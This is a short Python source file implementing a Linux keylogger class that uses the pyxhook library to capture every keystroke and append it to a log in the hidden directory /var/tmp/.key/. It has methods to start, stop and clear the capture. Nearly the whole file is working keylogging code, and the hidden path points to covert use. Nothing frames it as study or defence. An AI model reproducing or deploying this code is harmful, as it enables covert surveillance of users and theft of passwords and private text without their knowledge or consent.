import os
import pyxhook


class Keylog:
    def __init__(self):
        if not os.path.exists('/var/tmp/.key/'):
            os.makedirs('/var/tmp/.key/')
        self.log_file = os.environ.get('pylogger_file', os.path.expanduser('/var/tmp/.key/log.txt'))
        self.new_hook = pyxhook.HookManager()
        self.online = False

    def start_keylogger(self):
        self.online = True
        def OnKeyPress(event):
            with open(self.log_file, 'a') as f:
                if event.Key == "Return":
                    event.Key = "\n"
                f.write('{}'.format(event.Key))

        self.new_hook.KeyDown = OnKeyPress
        self.new_hook.HookKeyboard()
        try:
            self.new_hook.start()
        except KeyboardInterrupt:
            pass
        except Exception as ex:
            msg = 'Error while catching events:\n  {}'.format(ex)
            with open(self.log_file, 'a') as f:
                f.write('\n{}'.format(msg))

    def stop_keylogger(self):
        self.online = False
        self.new_hook.cancel()

    def clear_log(self):
        was_online = False
        if self.online:
            was_online = True
            self.stop_keylogger()
        if os.path.exists(self.log_file):
            os.remove(self.log_file)
        if was_online:
            self.start_keylogger()
